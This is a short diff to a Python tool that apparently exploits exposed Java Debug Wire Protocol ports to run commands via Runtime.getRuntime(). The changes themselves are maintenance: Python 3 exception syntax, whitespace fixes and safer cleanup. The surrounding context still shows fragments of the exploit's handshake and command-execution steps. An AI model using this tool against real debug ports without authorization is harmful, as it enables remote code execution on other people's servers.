@@ -184,7 +184,7 @@ class JDWPClient:
             s.connect( (host, port) )
         except socket.error as msg:
             raise Exception("Failed to connect: %s" % msg)
-      
+
         s.send( HANDSHAKE )
 
         if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
@@ -436,7 +436,7 @@ def runtime_exec(jdwp, args):
         print ("[-] Cannot find method Runtime.getRuntime()")
         return False
     print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
-    
+
     # 3. setup breakpoint on frequently called method
     c = jdwp.get_class_by_name( args.break_on_class )
     if c is None:
@@ -642,13 +642,15 @@ if __name__ == "__main__":
             retcode = 1
 
     except KeyboardInterrupt:
-        pass
+        print ("[+] Exiting on user's request")
 
-    except Exception, e:
+    except Exception as e:
         print ("[-] Exception: %s" % e)
         retcode = 1
+        cli = None
 
     finally:
-        cli.leave()
+        if cli:
+            cli.leave()
 
     sys.exit(retcode)
